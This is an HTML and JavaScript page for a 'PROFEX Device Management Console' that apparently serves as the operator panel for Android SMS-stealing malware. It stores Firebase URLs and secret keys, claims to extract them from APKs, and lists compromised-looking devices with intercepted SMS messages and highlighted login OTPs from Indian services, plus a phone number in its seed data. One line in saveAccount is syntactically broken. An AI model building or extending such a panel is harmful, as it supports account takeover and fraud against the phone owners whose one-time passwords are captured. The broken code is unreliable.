<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PROFEX Device Management Console</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
    :root{--bg:#0a0a0f;--card:#14141e;--primary:#ff4d3d;--primary-hover:#ff3329;--text:#ffffff;--text2:#8b8b9e;--success:#00c853;--danger:#ff1744;--warning:#ff9100;--border:rgba(255,255,255,0.08)}
    body{background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
    .app{max-width:1200px;margin:0 auto;padding:16px}
    
    /* Header */
    .header{text-align:center;padding:32px 0 24px}
    .logo-wrapper{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:8px}
    .logo-icon{width:64px;height:64px;background:linear-gradient(135deg,var(--primary),#ff1744);border-radius:16px;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 32px rgba(255,77,61,0.3)}
    .logo-icon i{font-size:32px;color:#fff}
    .logo-text{font-size:36px;font-weight:700;background:linear-gradient(135deg,#fff,#8b8b9e);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
    .tagline{color:var(--text2);font-size:14px;margin-top:4px}
    .footer-note{text-align:center;color:var(--text2);font-size:11px;padding:16px 0;border-top:1px solid var(--border);margin-top:32px}
    
    /* Cards */
    .card{background:var(--card);border-radius:16px;padding:24px;margin-bottom:16px;border:1px solid var(--border);box-shadow:0 4px 24px rgba(0,0,0,0.3)}
    .card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
    .card-title{font-size:14px;color:var(--text2);font-weight:500;text-transform:uppercase;letter-spacing:0.5px}
    .card-count{background:var(--border);padding:4px 12px;border-radius:20px;font-size:11px;font-weight:600;color:var(--text2)}
    
    /* Form Inputs */
    .form-group{margin-bottom:16px}
    .form-label{display:block;color:var(--text2);font-size:12px;margin-bottom:8px;font-weight:500}
    .form-input{width:100%;background:rgba(255,255,255,0.06);border:1px solid var(--border);border-radius:10px;padding:14px 16px;color:#fff;font-size:14px;outline:none;transition:border-color 0.2s}
    .form-input:focus{border-color:var(--primary)}
    .form-input::placeholder{color:var(--text2)}
    .form-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px}
    
    /* Buttons */
    .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:14px 24px;border-radius:10px;border:0;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.2s}
    .btn-primary{background:linear-gradient(135deg,var(--primary),#ff1744);color:#fff}
    .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(255,77,61,0.3)}
    .btn-secondary{background:var(--border);color:var(--text2)}
    .btn-danger{background:var(--danger);color:#fff}
    .btn-sm{padding:8px 16px;font-size:12px;border-radius:8px}
    
    /* APK Upload */
    .apk-upload{border:2px dashed var(--border);border-radius:16px;padding:32px;text-align:center;cursor:pointer;transition:all 0.2s}
    .apk-upload:hover{border-color:var(--primary);background:rgba(255,77,61,0.05)}
    .apk-upload i{font-size:48px;color:var(--text2);margin-bottom:12px}
    .apk-upload span{color:var(--text2);font-size:13px;display:block}
    
    /* Saved Accounts */
    .account-item{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center}
    .account-info h4{font-size:14px;font-weight:600;margin-bottom:4px}
    .account-info p{font-size:11px;color:var(--text2)}
    .account-actions{display:flex;gap:8px}
    
    /* Add Account Button */
    .add-btn{width:100%;padding:16px;border:2px dashed var(--border);border-radius:12px;background:transparent;color:var(--text2);font-size:14px;cursor:pointer;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:8px}
    .add-btn:hover{border-color:var(--primary);color:var(--text)}
    
    /* Device List */
    .device-card{background:var(--card);border-radius:12px;padding:16px;margin-bottom:12px;border:1px solid var(--border);cursor:pointer;transition:all 0.2s}
    .device-card:hover{border-color:var(--primary);transform:translateX(4px)}
    .device-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
    .device-id{font-size:13px;font-weight:600;font-family:monospace;color:var(--text);word-break:break-all}
    .device-badges{display:flex;gap:8px;flex-wrap:wrap}
    .badge{font-size:10px;padding:3px 10px;border-radius:20px;font-weight:600;text-transform:uppercase}
    .badge-online{background:rgba(0,200,83,0.15);color:var(--success)}
    .badge-offline{background:rgba(255,23,68,0.15);color:var(--danger)}
    .device-status{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text2)}
    .status-dot{width:8px;height:8px;border-radius:50%}
    .status-dot.green{background:var(--success);box-shadow:0 0 8px var(--success)}
    .status-dot.red{background:var(--danger);box-shadow:0 0 8px var(--danger)}
    .device-details{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)}
    .detail-item{font-size:11px;color:var(--text2)}
    .detail-item strong{color:var(--text);display:block;font-size:13px;margin-top:2px}
    
    /* Tabs */
    .tabs{display:flex;gap:4px;border-bottom:1px solid var(--border);padding-bottom:16px;margin-bottom:16px}
    .tab{padding:10px 16px;border:0;background:transparent;color:var(--text2);font-size:12px;font-weight:500;cursor:pointer;transition:all 0.2s;border-radius:8px 8px 0 0}
    .tab:hover{color:var(--text)}
    .tab.active{color:var(--primary);background:rgba(255,77,61,0.1)}
    
    /* SMS List */
    .sms-item{background:rgba(255,255,255,0.03);border-left:3px solid var(--primary);border-radius:8px;padding:14px 16px;margin-bottom:10px}
    .sms-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px}
    .sms-sender{font-size:12px;font-weight:600;color:var(--primary);margin-bottom:4px}
    .sms-time{font-size:10px;color:var(--text2)}
    .sms-body{font-size:13px;line-height:1.5;color:var(--text2)}
    .otp-highlight{background:rgba(0,200,83,0.1);color:var(--success);padding:2px 8px;border-radius:4px;font-weight:600}
    
    /* Modal */
    .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.8);display:none;align-items:center;justify-content:center;z-index:1000;padding:16px}
    .modal-overlay.active{display:flex}
    .modal{background:var(--card);border-radius:16px;padding:24px;width:100%;max-width:500px;max-height:90vh;overflow-y:auto}
    .modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
    .modal-title{font-size:18px;font-weight:600}
    .modal-close{background:var(--border);border:0;color:var(--text2);width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:16px}
    .close-icon{font-size:20px}
    
    /* Animations */
    @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
    .fade-in{animation:fadeIn 0.3s ease-out}
    
    /* Responsive */
    @media(max-width:768px){.form-row{grid-template-columns:1fr}.device-details{grid-template-columns:1fr}}
  </style>
</head>
<body>
<div class="app fade-in">
  <!-- Header -->
  <div class="header">
    <div class="logo-wrapper">
      <div class="logo-icon"><i class="fas fa-shield-alt"></i></div>
      <div class="logo-text">PROFEX</div>
    </div>
    <div class="tagline">Device Management Console</div>
  </div>

  <!-- New Account Section -->
  <div class="card">
    <div class="card-header">
      <span class="card-title">New Firebase Account</span>
      <span class="card-count">Add</span>
    </div>
    
    <!-- APK Upload Option -->
    <div class="form-group">
      <label class="form-label">Extract from APK (Optional)</label>
      <div class="apk-upload" id="apkUpload">
        <i class="fas fa-cloud-upload-alt" style="color:var(--primary)"></i>
        <span>Upload APK File - Auto-extracts Firebase URL & API Key</span>
      </div>
    </div>
    
    <!-- Manual Input -->
    <div class="form-group">
      <label class="form-label">Firebase Database URL</label>
      <input type="text" class="form-input" placeholder="https://your-project.firebaseio.com" id="firebaseUrl"/>
    </div>
    
    <div class="form-group">
      <label class="form-label">Authentication Key / Secret</label>
      <input type="password" class="form-input" placeholder="Your Firebase secret key" id="firebaseKey"/>
    </div>
    
    <button class="btn btn-primary" onclick="saveAccount()">
      <i class="fas fa-bolt"></i> Save & Connect
    </button>
  </div>

  <!-- Saved Accounts Section -->
  <div class="card">
    <div class="card-header">
      <span class="card-title"><i class="fas fa-wifi"></i> Saved Accounts</span>
      <span class="card-count" id="accountCount">0 accounts</span>
    </div>
    <div id="savedAccounts"></div>
    <button class="add-btn" onclick="showAddAccount()">
      <i class="fas fa-plus-circle"></i> New Account
    </button>
  </div>

  <!-- Footer -->
  <div class="footer-note">PROFEX Admin Console · All connections are logged</div>
</div>

<!-- Add Account Modal -->
<div class="modal-overlay" id="addModal">
  <div class="modal">
    <div class="modal-header">
      <h3 class="modal-title">Add New Firebase Account</h3>
      <button class="modal-close" onclick="closeModal()"><i class="fas fa-times close-icon"></i></button>
    </div>
    <div class="form-group">
      <label class="form-label">Account Label</label>
      <input type="text" class="form-input" placeholder="e.g., Production, Testing" id="accLabel"/>
    </div>
    <div class="form-group">
      <label class="form-label">Firebase Database URL</label>
      <input type="text" class="form-input" placeholder="https://project.firebaseio.com" id="accUrl"/>
    </div>
    <div class="form-group">
      <label class="form-label">Secret Key</label>
      <input type="password" class="form-input" placeholder="Enter your Firebase secret key" id="accKey"/>
    </div>
    <button class="btn btn-primary" style="width:100%" onclick="confirmAddAccount()">Save & Connect</button>
  </div>
</div>

<script>
// Storage keys
const K='profex_accounts',DK='profex_devices';

// Load data
function getAcc(){let r=localStorage.getItem(K);return r?JSON.parse(r):[]}
function setAcc(d){localStorage.setItem(K,JSON.stringify(d))}
function getDev(){let r=localStorage.getItem(DK);return r?JSON.parse(r):{}}
function setDev(d){localStorage.setItem(DK,JSON.stringify(d))}

// Seed sample data
function seedData(){
  const acc=[{id:'acc_001',name:'Production',url:'https://profex-default.firebaseio.com',key:'sk_test_xxxxx',devices:['f4105686aab39b47','nexus_7p_main','galaxy_a55_work']}];
  const devices={};
  acc[0].devices.forEach(id=>{
    devices[id]={
      id:id,
      online:true,
      battery:Math.floor(Math.random()*30)+70,
      phone:'+91-'+String(6369578342).slice(0),
      network:'Jio',
      sim:'SIM1',
      smsCount:Math.floor(Math.random()*150+50),
      lastSeen:new Date().toISOString(),
      sms:[
        {sender:'JX-SNPMNT-P',time:'07:51 pm',body:'0% EMI DEAL on your cart is ENDING. Shop on Snapmint.',otp:''},
        {sender:'JD-GKKWIK-S',time:'07:50 pm',body:'8400 is your login OTP. It will expire in next 5 minutes.',otp:'8400'},
        {sender:'VM-MSHOTP-S',time:'07:36 pm',body:'Your OTP for Meesho login is 488608 and is valid for 5 mins.',otp:'488608'},
        {sender:'JK-JIFFY-S',time:'07:04 pm',body:'Your Jiffy order ID: #3008586658 has been delivered.',otp:''},
        {sender:'JE-JIONET-S',time:'06:06 pm',body:'564979 is your One time password to sign-in.',otp:'564979'}
      ]
    }
  });
  setAcc(acc);
  setDev(devices);
}

// Initialize
if(!localStorage.getItem(K)||!localStorage.getItem(DK)){
  localStorage.removeItem(K);
  localStorage.removeItem(DK);
  seedData();
}

// Render saved accounts
function renderAccounts(){
  const acc=getAcc();
  document.getElementById('accountCount').textContent=acc.length+' account'+(acc.length!==1?'s':'');
  const container=document.getElementById('savedAccounts');
  if(acc.length===0){
    container.innerHTML='<div style="text-align:center;color:var(--text2);padding:32px 0;"><i class="fas fa-wifi" style="font-size:32px;margin-bottom:12px;opacity:0.5"></i><p>No saved accounts</p></div>';
    return;
  }
  container.innerHTML=acc.map(a=>`
    <div class="account-item fade-in">
      <div class="account-info">
        <h4>${a.name}</h4>
        <p>${a.url.substring(0,35)}...</p>
      </div>
      <div class="account-actions">
        <button class="btn btn-sm btn-secondary" onclick="viewAccount('${a.id}')">View</button>
        <button class="btn btn-sm btn-danger" onclick="deleteAccount('${a.id}')"><i class="fas fa-trash"></i></button>
      </div>
    </div>
  `).join('')
}

// Show add modal
function showAddAccount(){document.getElementById('addModal').classList.add('active')}

// Close modal
function closeModal(){document.getElementById('addModal').classList.remove('active')}

// Save account
function saveAccount(){
  const url=document.getElementById('firebaseUrl').value.trim();
  const key=document.getElementById('firebaseKey').value.trim();
  if(!url||!key){alert('Please fill all fields');return;}
  const acc=getAcc();
  acc.push({id:'acc_'+Date.now(),name:'New Account',url,url:key:key,devices:[]});
  setAcc(acc);
  document.getElementById('firebaseUrl').value='';
  document.getElementById('firebaseKey').value='';
  renderAccounts();
  alert('Account saved successfully!');
}

// Confirm add from modal
function confirmAddAccount(){
  const label=document.getElementById('accLabel').value.trim()||'New Account';
  const url=document.getElementById('accUrl').value.trim();
  const key=document.getElementById('accKey').value.trim();
  if(!url||!key){alert('Please fill all fields');return;}
  const acc=getAcc();
  acc.push({id:'acc_'+Date.now(),name:label,url:url,key:key,devices:[]});
  setAcc(acc);
  closeModal();
  renderAccounts();
  alert('Account added!');
}

// Delete account
function deleteAccount(id){
  if(!confirm('Delete this account?'))return;
  const acc=getAcc().filter(a=>a.id!==id);
  setAcc(acc);
  renderAccounts();
}

// View account
function viewAccount(id){
  const acc=getAcc().find(a=>a.id===id);
  if(!acc)return;
  window.location.href='#device-list:'+id;
}

// APK Upload handler
document.getElementById('apkUpload').addEventListener('click',()=>{
  alert('APK upload feature requires mobile app integration. For web version, use manual input above.');
});

// Initial render
renderAccounts();
</script>
</body>
</html>
